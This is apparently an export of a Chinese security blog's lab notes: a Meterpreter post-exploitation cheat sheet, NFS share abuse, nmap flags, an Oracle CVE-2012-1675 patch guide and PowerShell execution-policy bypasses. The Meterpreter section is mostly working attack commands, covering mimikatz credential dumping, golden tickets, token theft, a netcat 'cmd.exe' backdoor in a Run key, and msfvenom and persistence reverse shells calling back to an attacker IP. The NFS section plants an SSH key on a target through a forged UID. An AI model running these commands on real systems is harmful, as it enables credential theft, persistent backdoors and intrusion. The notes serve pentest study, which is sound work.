<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">load mimikatz #加载模块</span><br><span class="line">wdigest #获取Wdigest密码</span><br><span class="line">mimikatz_command -f samdump::hashes  #执行mimikatz原始命令</span><br><span class="line">mimikatz_command -f sekurlsa::searchPasswords #同样也是获取密码</span><br></pre></td></tr></table></figure>

<p>mimikatz也有exe版本的，<a href="https://github.com/gentilkiwi/mimikatz/releases" target="_blank" rel="noopener">下载地址</a></p>
<p>控制台获取hash</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">privilege::debug # 权限提升</span><br><span class="line">lsadump::lsa &#x2F;patch # 获取hash</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">直接cmd运行</span><br><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::logonPasswords full&quot; exit</span><br><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;lsadump::lsa &#x2F;patch&quot; exit</span><br></pre></td></tr></table></figure>

<p>新版是kiwi了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">load kiwi #加载模块</span><br><span class="line"></span><br><span class="line">creds_all              Retrieve all credentials (parsed) #直接用就能从内存中抓取明文密码。</span><br><span class="line">creds_kerberos         Retrieve Kerberos creds (parsed)</span><br><span class="line">creds_msv              Retrieve LM&#x2F;NTLM creds (parsed)</span><br><span class="line">creds_ssp              Retrieve SSP creds</span><br><span class="line">creds_tspkg            Retrieve TsPkg creds (parsed)</span><br><span class="line">creds_wdigest          Retrieve WDigest creds (parsed)</span><br><span class="line">dcsync                 Retrieve user account information via DCSync (unparsed)</span><br><span class="line">dcsync_ntlm            Retrieve user account NTLM hash, SID and RID via DCSync</span><br><span class="line">golden_ticket_create   Create a golden kerberos ticket</span><br><span class="line">kerberos_ticket_list   List all kerberos tickets (unparsed)</span><br><span class="line">kerberos_ticket_purge  Purge any in-use kerberos tickets</span><br><span class="line">kerberos_ticket_use    Use a kerberos ticket</span><br><span class="line">kiwi_cmd               Execute an arbitary mimikatz command (unparsed)</span><br><span class="line">lsa_dump_sam           Dump LSA SAM (unparsed)</span><br><span class="line">lsa_dump_secrets       Dump LSA secrets (unparsed)</span><br><span class="line">password_change        Change the password&#x2F;hash of a user</span><br><span class="line">wifi_list              List wifi profiles&#x2F;creds for the current user</span><br><span class="line">wifi_list_shared       List shared wifi profiles&#x2F;creds (requires SYSTEM)</span><br></pre></td></tr></table></figure>

<h3 id="Golden-Ticket"><a href="#Golden-Ticket" class="headerlink" title="Golden-Ticket"></a>Golden-Ticket</h3><h4 id="minikatz"><a href="#minikatz" class="headerlink" title="minikatz"></a>minikatz</h4><p>在mimikatz的控制台输入</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">privilege::debug # 获取权限</span><br><span class="line"></span><br><span class="line">lsadump::lsa &#x2F;inject &#x2F;name:krbtgt # 获取信息（关注 SID，NTLM。后面会用到</span><br><span class="line"></span><br><span class="line">kerberos::golden &#x2F;user:Administrator &#x2F;domain:domain.local &#x2F;sid:krbtgt的sid &#x2F;krbtgt:krbtgt的NTLM &#x2F;id:Administrator的RID </span><br><span class="line"></span><br><span class="line">misc::cmd # 打开一个cmd</span><br><span class="line"></span><br><span class="line">之后就可以在那里访问域中的其他机器了</span><br></pre></td></tr></table></figure>


<h3 id="sniffer抓包"><a href="#sniffer抓包" class="headerlink" title="sniffer抓包"></a>sniffer抓包</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">use sniffer</span><br><span class="line">sniffer_interfaces   #查看网卡</span><br><span class="line">sniffer_start 2   #选择网卡 开始抓包</span><br><span class="line">sniffer_stats 2   #查看状态</span><br><span class="line">sniffer_dump 2 &#x2F;tmp&#x2F;lltest.pcap  #导出pcap数据包</span><br><span class="line">sniffer_stop 2   #停止抓包</span><br></pre></td></tr></table></figure>

<h3 id="注册表操作"><a href="#注册表操作" class="headerlink" title="注册表操作"></a>注册表操作</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">upload &#x2F;usr&#x2F;share&#x2F;windows-binaries&#x2F;nc.exe C:\\windows\\system32 #上传nc</span><br><span class="line">reg enumkey -k HKLM\\software\\microsoft\\windows\\currentversion\\run   #枚举run下的key</span><br><span class="line">reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v lltest_nc -d &#39;C:\windows\system32\nc.exe -Ldp 443 -e cmd.exe&#39; #设置键值</span><br><span class="line">reg queryval -k HKLM\\software\\microsoft\\windows\\currentversion\\Run -v lltest_nc   #查看键值</span><br><span class="line"></span><br><span class="line">nc -v 192.168.159.144 443  #攻击者连接nc后门</span><br></pre></td></tr></table></figure>

<h3 id="令牌操纵"><a href="#令牌操纵" class="headerlink" title="令牌操纵"></a>令牌操纵</h3><h4 id="incognito假冒令牌"><a href="#incognito假冒令牌" class="headerlink" title="incognito假冒令牌"></a>incognito假冒令牌</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">use incognito      #help incognito  查看帮助</span><br><span class="line">list_tokens -u    #查看可用的token</span><br><span class="line">impersonate_token &#39;NT AUTHORITY\SYSTEM&#39;  #假冒SYSTEM token</span><br><span class="line">或者impersonate_token NT\ AUTHORITY\\SYSTEM #不加单引号 需使用\\</span><br><span class="line">execute -f cmd.exe -i –t    # -t 使用假冒的token 执行</span><br><span class="line">或者直接shell</span><br><span class="line">rev2self   #返回原始token</span><br></pre></td></tr></table></figure>

<h4 id="steal-token-窃取令牌"><a href="#steal-token-窃取令牌" class="headerlink" title="steal_token 窃取令牌"></a>steal_token 窃取令牌</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">steal_token &lt;pid值&gt;   #从指定进程中窃取token   先ps</span><br><span class="line">drop_token  #删除窃取的token</span><br></pre></td></tr></table></figure>

<h3 id="后门植入"><a href="#后门植入" class="headerlink" title="后门植入"></a>后门植入</h3><h4 id="persistence"><a href="#persistence" class="headerlink" title="persistence"></a>persistence</h4><p><code>persistence</code>是生成一个vbs脚本，并写入到注册表里。<br>帮助目录</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">OPTIONS:</span><br><span class="line"></span><br><span class="line">    -A        Automatically start a matching exploit&#x2F;multi&#x2F;handler to connect to the agent 自动启动一个匹配</span><br><span class="line">    -L &lt;opt&gt;  Location in target host to write payload to, if none %TEMP% will be used. </span><br><span class="line">    -P &lt;opt&gt;  Payload to use, default is windows&#x2F;meterpreter&#x2F;reverse_tcp. 设置payload</span><br><span class="line">    -S        Automatically start the agent on boot as a service (with SYSTEM privileges) 系统启动时加载</span><br><span class="line">    -T &lt;opt&gt;  Alternate executable template to use</span><br><span class="line">    -U        Automatically start the agent when the User logs on 用户登录时启动</span><br><span class="line">    -X        Automatically start the agent when the system boots 系统开机时启动</span><br><span class="line">    -h        This help menu</span><br><span class="line">    -i &lt;opt&gt;  The interval in seconds between each connection attempt 反向连接的时间间隔</span><br><span class="line">    -p &lt;opt&gt;  The port on which the system running Metasploit is listening 攻击机监听的端口</span><br><span class="line">    -r &lt;opt&gt;  The IP of the system running Metasploit listening for the connect back 攻击者的IP</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; run persistence -A -X -S -U -i 2 -p 6660 -r 192.168.2.2 -P windows&#x2F;meterpreter&#x2F;bind_tcp</span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post&#x2F;windows&#x2F;manage&#x2F;persistence_exe.</span><br><span class="line">[!] Example: run post&#x2F;windows&#x2F;manage&#x2F;persistence_exe OPTION&#x3D;value [...]</span><br><span class="line">[*] Running Persistence Script</span><br><span class="line">[*] Resource file for cleanup created at &#x2F;root&#x2F;.msf4&#x2F;logs&#x2F;persistence&#x2F;WIN-L7LB8P6KDBM_20191210.2300&#x2F;WIN-L7LB8P6KDBM_20191210.2300.rc</span><br><span class="line">[*] Creating Payload&#x3D;windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.168.1.83 LPORT&#x3D;6660</span><br><span class="line">[*] Persistent agent script is 99613 bytes long</span><br><span class="line">[+] Persistent Script written to C:\Users\ADMINI~1\AppData\Local\Temp\1\gqePMVuqNBvev.vbs</span><br><span class="line">[*] Executing script C:\Users\ADMINI~1\AppData\Local\Temp\1\gqePMVuqNBvev.vbs</span><br><span class="line">[+] Agent executed with PID 5012</span><br><span class="line">[*] Installing into autorun as HKCU\Software\Microsoft\Windows\CurrentVersion\Run\IwoxhlDkIPJSZa</span><br><span class="line">[+] Installed into autorun as HKCU\Software\Microsoft\Windows\CurrentVersion\Run\IwoxhlDkIPJSZa</span><br></pre></td></tr></table></figure>

<p>根据输出信息，可以在靶机中找到相对应的注册表<br><img src="https://images.atsud0.me/images/post/Screenshot_20191211_105220_persistence_regedit.png" alt="regedit"></p>
<h5 id="连接persistence后门"><a href="#连接persistence后门" class="headerlink" title="连接persistence后门"></a>连接persistence后门</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msf5 exploit(multi&#x2F;handler) &gt; use exploit&#x2F;multi&#x2F;handler </span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt; set payload windows&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt; set lhost 192.168.1.83</span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt; set lport 6660</span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt; run</span><br></pre></td></tr></table></figure>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20191211_103433_persistence.png" alt="persistence"></p>
<h4 id="metsvc后门"><a href="#metsvc后门" class="headerlink" title="metsvc后门"></a>metsvc后门</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">search metsvc</span><br><span class="line">use exploit&#x2F;windows&#x2F;local&#x2F;persistence_service</span><br></pre></td></tr></table></figure>

<h5 id="连接metsvc后门"><a href="#连接metsvc后门" class="headerlink" title="连接metsvc后门"></a>连接metsvc后门</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msf5 exploit(multi&#x2F;handler) &gt; use exploit&#x2F;multi&#x2F;handler </span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt; set payload windows&#x2F;metsvc_bind_tcp </span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt; set rhost 192.168.1.84</span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt; set lport 31337</span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt; run</span><br></pre></td></tr></table></figure>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20191211_110850_metsvc_bind_tcp.png" alt="con_metsvc"></p>
<h4 id="msfvenom"><a href="#msfvenom" class="headerlink" title="msfvenom"></a>msfvenom</h4><p>生成windows下的反弹木马</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;192.168.1.83 lport&#x3D;1111 -f exe -o a.exe</span><br><span class="line">#上传到靶机并执行</span><br><span class="line">meterpreter &gt; upload .&#x2F;a.exe</span><br><span class="line">[*] uploading  : .&#x2F;a.exe -&gt; a.exe</span><br><span class="line">[*] Uploaded 72.07 KiB of 72.07 KiB (100.0%): .&#x2F;a.exe -&gt; a.exe</span><br><span class="line">[*] uploaded   : .&#x2F;a.exe -&gt; a.exe</span><br><span class="line">meterpreter &gt; execute -f a.exe</span><br><span class="line">Process 1892 created.</span><br></pre></td></tr></table></figure>

<h5 id="连接后门"><a href="#连接后门" class="headerlink" title="连接后门"></a>连接后门</h5><p>在<code>msfconsole</code>中，使用<code>exploit/multi/handler</code>，设置的<code>payload</code>要与生成的木马的<code>payload</code>设置一样.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msf5 exploit(multi&#x2F;handler) &gt; set payload windows&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt; set lhost 192.168.1.83</span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt; set lport 1111</span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt; run</span><br></pre></td></tr></table></figure>

<p><img src="https://images.atsud0.me/images/post/Screenshot_20191211_133343_.png" alt="msfvenom"></p>
<p>注意：当退出此会话时，木马的进程同时也会关闭.</p>
<h4 id="MSF取得的会话派生到CS"><a href="#MSF取得的会话派生到CS" class="headerlink" title="MSF取得的会话派生到CS"></a>MSF取得的会话派生到CS</h4><ol>
<li>先在CS中新建一个http的监听</li>
<li>在msf中使用这个模块:exploit/windows/local/payload_inject</li>
<li>设置payload为http的监听: windows/meterpreter/reverse_http</li>
<li>关闭DisablePayloadHandler:<code>set DisablePayloadHandler true</code></li>
<li>设置会话和本地监听后运行即可</li>
<li>回到cs中可以看到已经获得shell了</li>
</ol>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
<li><a href="https://www.secpulse.com/archives/51077.html" target="_blank" rel="noopener">msf派生shell给cs</a></li>
<li><a href="http://drops.xmd5.com/static/drops/tips-2227.html" target="_blank" rel="noopener">metasploit渗透测试笔记</a></li>
<li><a href="https://xz.aliyun.com/t/2536#toc-0" target="_blank" rel="noopener">后渗透之meterpreter使用攻略</a></li>
<li><a href="https://blog.csdn.net/qq_41880069/article/details/82908293#4_114" target="_blank" rel="noopener">meterpreter后渗透攻击总结</a></li>
<li><a href="https://paper.seebug.org/29/#meterpreter" target="_blank" rel="noopener">Ppaer渗透工具篇</a></li>
</ul>
]]></content>
      <categories>
        <category>靶机实验</category>
      </categories>
      <tags>
        <tag>Windows</tag>
        <tag>Metasploit</tag>
        <tag>MS17_010</tag>
      </tags>
  </entry>
  <entry>
    <title>NFS笔记</title>
    <url>/2020/09/26/NFS%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>NFS学习</p>
<a id="more"></a>

<h2 id="NFS"><a href="#NFS" class="headerlink" title="NFS"></a>NFS</h2><p>NFS是啥服务呢？NFS是Network File System的简写。它允许一个系统在网络上与其他系统共享目录和文件。通过使用NFS，用户和程序几乎可以像访问本地文件一样访问远程系统上的文件。它通过在服务器上挂载文件系统的全部或部分来实现这一点。客户机可以使用分配给每个文件的任何特权访问挂载的文件系统的部分。</p>
<p>1.挂载磁盘-&gt;2.NFSD（NFS Daemon）会使用rpc连接到相关的挂载进程-&gt;3.服务器将检查连接用户权限，并返回文件句柄</p>
<p>所以，rpc实际上为Remote Procedure Call，翻译过来为“远程过程调用”。目前，主流的平台中都支持各种远程调用技术，以满足分布式系统架构中不同的系统之间的远程通信和相互调用</p>
<h2 id="枚举服务"><a href="#枚举服务" class="headerlink" title="枚举服务"></a>枚举服务</h2><h3 id="nmap-脚本"><a href="#nmap-脚本" class="headerlink" title="nmap 脚本"></a>nmap 脚本</h3><p>nmap -sV -p 111 –script=rpcinfo {target_ip}</p>
<p>关于nfs的脚本目录</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;usr&#x2F;share&#x2F;nmap&#x2F;scripts&#x2F;nfs-ls.nse</span><br><span class="line">&#x2F;usr&#x2F;share&#x2F;nmap&#x2F;scripts&#x2F;nfs-statfs.nse</span><br><span class="line">&#x2F;usr&#x2F;share&#x2F;nmap&#x2F;scripts&#x2F;nfs-showmount.nse</span><br></pre></td></tr></table></figure>

<h3 id="usr-sbin-showmount"><a href="#usr-sbin-showmount" class="headerlink" title="/usr/sbin/showmount"></a>/usr/sbin/showmount</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;usr&#x2F;sbin&#x2F;showmount -e [ip]</span><br></pre></td></tr></table></figure>

<p>这个命令也可以显示有什么目录能够挂载</p>
<h3 id="挂载操作"><a href="#挂载操作" class="headerlink" title="挂载操作"></a>挂载操作</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mkdir &#x2F;tmp&#x2F;nfs</span><br><span class="line">mount -o rw,vers&#x3D;2 10.10.10.10:&#x2F;tmp &#x2F;tmp&#x2F;nfs</span><br></pre></td></tr></table></figure>

<p>探测可挂载的目录。 可以看到/home/peter允许挂载，那么我们就可以挂载之后在自己的机器上添加一个用户，去操作这个用户的文件之类的。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap -p 111 --script&#x3D;nfs* 192.168.56.7</span><br><span class="line">Starting Nmap 7.80 ( https:&#x2F;&#x2F;nmap.org ) at 2020-07-12 07:40 EDT</span><br><span class="line">Nmap scan report for 192.168.56.7</span><br><span class="line">Host is up (0.00092s latency).</span><br><span class="line"></span><br><span class="line">PORT    STATE SERVICE</span><br><span class="line">111&#x2F;tcp open  rpcbind</span><br><span class="line">| nfs-showmount: </span><br><span class="line">|_  &#x2F;home&#x2F;peter *</span><br></pre></td></tr></table></figure>

<p>写入操作。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mkdir ~&#x2F;home</span><br><span class="line">sudo mount 192.168.56.7:&#x2F;home&#x2F; &#x2F;home&#x2F;kali&#x2F;home&#x2F;</span><br><span class="line">sudo grounpadd -g 1005 peter</span><br><span class="line">sudo adduser peter -uid 1001 -gid 1005</span><br><span class="line"></span><br><span class="line">su peter</span><br><span class="line">ssh-keygen</span><br><span class="line">cat ~&#x2F;home&#x2F;.ssh&#x2F;id_rsa.pub &gt;&#x2F;home&#x2F;kali&#x2F;home&#x2F;peter&#x2F;.ssh&#x2F;authorized_keys</span><br><span class="line">ssh peter@192.168.56.7</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Note</category>
      </categories>
      <tags>
        <tag>NFS</tag>
      </tags>
  </entry>
  <entry>
    <title>NMAP快速指北</title>
    <url>/2020/04/14/NMAP%E5%BF%AB%E9%80%9F%E6%8C%87%E5%8C%97/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p><img src="https://images.atsud0.me/images/post/image-1586576283298.png" alt="file"></p>
<p>获取更详细教程：<a href="https://nmap.org/" target="_blank" rel="noopener">nmap</a></p>
<p><strong>-h 帮助目录</strong><br>-O 系统探测<br>-sS/sT/sU/sA/sW/sM/sN/sF/sX 各种不同的探测<br>-T[x](0-5) 数字越高，耗费时间越少，但容易触发防火墙报警<br>-sV 服务版本探测<br>-vv/-v 详细信息多一个v更啰嗦一点<br>-oX/oN/oS/oG 将扫描结果输出到文件（不同格式）X:xml N:nmap 标准nmap输出 G:grep<br>-A 包含系统探测-O，服务版本探测-sV 脚本探测-sC 路由追踪等<br>-p 指定端口<br>-p- 扫描所有端口<br>-sn ping扫描<br>– iL 导入文件<br>–exclude 后面跟的主机或者网段将不在扫描范围内<br>–excludefile 文件</p>
<p>-Pn 跳过主机发现阶段（就是不去ping它，默认它在线<br>-sn ping扫描,主机发现</p>
<h2 id="脚本使用"><a href="#脚本使用" class="headerlink" title="脚本使用"></a>脚本使用</h2><p>–script 使用脚本<br>–script vuln使用nmap自带的所有脚本</p>
<p>–script=script_name</p>
<p>更多脚本使用方式：<a href="https://klionsec.github.io/2017/05/18/nmap-script/" target="_blank" rel="noopener">https://klionsec.github.io/2017/05/18/nmap-script/</a></p>
<p>更多内容…正在施工中~</p>
<p><img src="https://images.atsud0.me/images/post/image-1586576193417.png" alt="file"></p>
]]></content>
      <categories>
        <category>Note</category>
        <category>Tools</category>
      </categories>
      <tags>
        <tag>nmap</tag>
      </tags>
  </entry>
  <entry>
    <title>Oracle-11.2.0.3-CVE-2012-1675远程投毒漏洞修复</title>
    <url>/2020/10/20/Oracle-11-2-0-3-CVE-2012-1675%E8%BF%9C%E7%A8%8B%E6%8A%95%E6%AF%92%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>环境：Centos 6.9 + Oracle 11.2.0.3/11.2.0.4 单实例</p>
<p>本次需求：修复CVE-2012-1675 远程投毒漏洞</p>
<p>应用的补丁为：</p>
<ul>
<li>p6880880_112000_Linux-x86-64</li>
<li>p12880299_112030_Linux-x86-64</li>
</ul>
<a id="more"></a>

<h2 id="Oracle-11-2-0-3-单实例"><a href="#Oracle-11-2-0-3-单实例" class="headerlink" title="Oracle 11.2.0.3 单实例"></a>Oracle 11.2.0.3 单实例</h2><p>应用补丁修复之前</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$ORACLE_HOME</span>/OPatch/opatch version</span><br></pre></td></tr></table></figure>

<p><img src="https://images.atsud0.me/images/post/image-20201020110921002.png" alt="image-20201020110921002"></p>
<p>msf poc检测</p>
<p><img src="https://images.atsud0.me/images/post/image-20201020110937517.png" alt="image-20201020110937517"></p>
<p>将PSU补丁复制到服务器然后解压得一个Opatch目录。</p>
<p>原先Opatch的备份,解压出来的OPatch复制到$ORACLE_HOME</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mv <span class="variable">$ORACLE_HOME</span>/OPatch ./OPatch_bak</span><br><span class="line">mv OPatch <span class="variable">$ORACLE_HOME</span>/</span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> <span class="variable">$ORACLE_HOME</span></span><br><span class="line"></span><br><span class="line">chmod 777 -R OPatch <span class="comment">## 这里要给复制过去的OPatch下的可执行程序赋予可执行权限，建议不要全777（这里是我测试环境为了方便给的。</span></span><br><span class="line"></span><br><span class="line">./opatch version <span class="comment">##重新验证</span></span><br></pre></td></tr></table></figure>

<p><img src="https://images.atsud0.me/images/post/image-20201020111802721.png" alt="image-20201020111802721"></p>
<p>但是此时还是没有应用补丁。</p>
<p>下载并解压12880299应用补丁，应用前需要关闭服务。中间会要求输入Oracle账号，回车回车N。就好了。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">lsnrctl stop # 关闭服务</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/u01/ora11g/db_1/OPatch/opatch apply -oh <span class="variable">$ORACLE_HOME</span> -<span class="built_in">local</span> /home/oracle/12880299/</span><br><span class="line"></span><br><span class="line"><span class="variable">$ORACLE_HOME</span>/OPatch/opatch lsinventory <span class="comment">## 检测是否成功打上了</span></span><br></pre></td></tr></table></figure>

<p><img src="https://images.atsud0.me/images/post/image-20201020112558357.png" alt="image-20201020112558357"></p>
<p>编辑<code>listener.ora</code>文件 </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find / -name <span class="string">"listener.ora"</span> 2&gt;/dev/null <span class="comment">#搜索文件，编辑没有/simple/那个</span></span><br></pre></td></tr></table></figure>

<p>添加以下内容到文件到文件末尾。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SECURE_REGISTER_LISTENER &#x3D; (IPC,TCP,TCPS)</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">lsnrctl start #开启监听。</span><br></pre></td></tr></table></figure>

<p>如果重新启动或关闭的时候出现以下错误信息，那多半是你环境变量问题。。。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Message 1070 not found; No message file for product&#x3D;network, facility&#x3D;TNSTNSLSNR for Linux: Version 11.2.0.3.0 - Production</span><br><span class="line">Message 279 not found; No message file for product&#x3D;network, facility&#x3D;NL</span><br><span class="line">Message 1073 not found; No message file for product&#x3D;network, facility&#x3D;TNS</span><br><span class="line">Message 1053 not found; No message file for product&#x3D;network, 啥的啥的啥的。。。。。。。。。。。。。。。。。。。。。</span><br></pre></td></tr></table></figure>

<p>给个环境变量就好。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">export ORACLE_HOME&#x3D;&#x2F;u01&#x2F;ora11g&#x2F;db_1&#x2F;</span><br></pre></td></tr></table></figure>



<p>重新漏洞检测</p>
<p><img src="https://images.atsud0.me/images/post/image-20201020112826883.png" alt="image-20201020112826883"></p>
<h2 id="Oracle-11-2-0-4-单实例"><a href="#Oracle-11-2-0-4-单实例" class="headerlink" title="Oracle 11.2.0.4 单实例"></a>Oracle 11.2.0.4 单实例</h2><p>11.2.0.4不需要打补丁，只需要在listener.ora下添加一行即可。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">VALID_NODE_CHECKING_REGISTRATION_LISTENER&#x3D;1</span><br></pre></td></tr></table></figure>

<p><img src="https://images.atsud0.me/images/post/image-20201110192031065.png" alt="image-20201110192031065"></p>
<p>参考文章</p>
<ul>
<li><p><a href="http://www.learnfuture.com/Extend/ArticleContent?id=4e81a5c2-d0e6-4765-851b-4d08cf1cc876" target="_blank" rel="noopener">Oracle 远程注册监听投毒漏洞修复</a></p>
</li>
<li><p><a href="http://blog.sina.com.cn/s/blog_683406fa0101mwr2.html" target="_blank" rel="noopener"><strong>Using Class of Secure Transport (COST) to Restrict Instance Registration (文档 ID 1453883.1)</strong></a></p>
</li>
<li><p>[<a href="https://www.cnblogs.com/jyzhao/p/5864593.html" target="_blank" rel="noopener">Oracle 11g RAC 应用补丁简明版</a>](</p>
</li>
</ul>
]]></content>
      <categories>
        <category>漏洞修复</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>CVE-2012-1675</tag>
        <tag>OracleDatabase</tag>
      </tags>
  </entry>
  <entry>
    <title>PowerShell笔记</title>
    <url>/2020/06/16/PowerShell%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>还有很多待补充。有时候会遇到一些windows的机器，所以还是要学下powershell的。</p>
<a href="https://tryhackme.com/room/powershell" title="" target="">Hacking with Powershell</a>
<a href="https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993" title="" target="">Powershell cheatsheet</a>
<a id="more"></a>

<h2 id="Powershell"><a href="#Powershell" class="headerlink" title="Powershell"></a>Powershell</h2><p>后缀</p>
<ul>
<li>ps1 脚本文件</li>
<li>ps1xml xml文档</li>
<li>psc1 控制台文件</li>
<li>psm1 脚本模块</li>
</ul>
<p>基于Powershell的渗透框架</p>
<ul>
<li>Powershell Empire</li>
<li>PSAttack</li>
<li>PowerSploit</li>
<li>Nishang</li>
<li>CS</li>
</ul>
<h1 id="基本命令"><a href="#基本命令" class="headerlink" title="基本命令"></a>基本命令</h1><h2 id="Get-Help-amp-GetCommand"><a href="#Get-Help-amp-GetCommand" class="headerlink" title="Get-Help&amp;GetCommand"></a>Get-Help&amp;GetCommand</h2><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Get-Help</span></span><br><span class="line"><span class="built_in">Get-Help</span> <span class="built_in">Get-Command</span> 获取<span class="built_in">Get-Command</span>的帮助</span><br><span class="line"><span class="built_in">Get-Command</span> 获取所有命令</span><br><span class="line"><span class="built_in">Get-Command</span> *you need to find* 模糊查找命令</span><br><span class="line">(<span class="built_in">get-command</span> your_need_to_find_command).parameters 获得该命令的参数</span><br><span class="line"><span class="built_in">Get-Command</span> New-* 获得new开头的命令</span><br><span class="line"></span><br><span class="line"><span class="built_in">Get-Command</span> | <span class="built_in">Get-Member</span> <span class="literal">-MemberType</span> Method <span class="comment"># 查看命令的方法属性等</span></span><br></pre></td></tr></table></figure>

<h2 id="powershell大小写"><a href="#powershell大小写" class="headerlink" title="powershell大小写"></a>powershell大小写</h2><p>命令，参数不区分大小写，但是参数值区分大小写。</p>
<ul>
<li>windows，linux，中的文件名写入，保留大小写。</li>
<li>windows文件名读取，不区分大小写。</li>
<li>linux文件名读取，区分大小写。</li>
</ul>
<h2 id="Powershell-执行策略"><a href="#Powershell-执行策略" class="headerlink" title="Powershell 执行策略"></a>Powershell 执行策略</h2><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#查询现在的策略</span></span><br><span class="line"><span class="built_in">get-executionpolicy</span></span><br></pre></td></tr></table></figure>

<ul>
<li><p>Restricted——默认的设置， 不允许任何script运行</p>
</li>
<li><p>AllSigned——只能运行经过数字证书签名的script</p>
</li>
<li><p>RemoteSigned——运行本地的script不需要数字签名，但是运行从网络上 下载的script就必须要有数字签名</p>
</li>
<li><p>Unrestricted——允许所有的script运行。</p>
<p>绕过执行策略能使我们做但是不仅限于以下的操作</p>
<ul>
<li>文件不落地执行</li>
<li>调用widnows api</li>
<li>避免被杀软检测</li>
<li>被标记为信任</li>
</ul>
</li>
</ul>
<h3 id="当执行策略为Restricted（默认策略）时如何绕过"><a href="#当执行策略为Restricted（默认策略）时如何绕过" class="headerlink" title="当执行策略为Restricted（默认策略）时如何绕过"></a>当执行策略为Restricted（默认策略）时如何绕过</h3><h4 id="1-powershell-exe-noprofile"><a href="#1-powershell-exe-noprofile" class="headerlink" title="1.powershell.exe -noprofile -"></a>1.powershell.exe -noprofile -</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Write-Host</span> <span class="built_in">Write-Host</span> <span class="string">'My voice is my passport, verify me.'</span> | powershell.exe <span class="literal">-noprofile</span> -</span><br></pre></td></tr></table></figure>

<p>不会写入磁盘，也不会更改配置。</p>
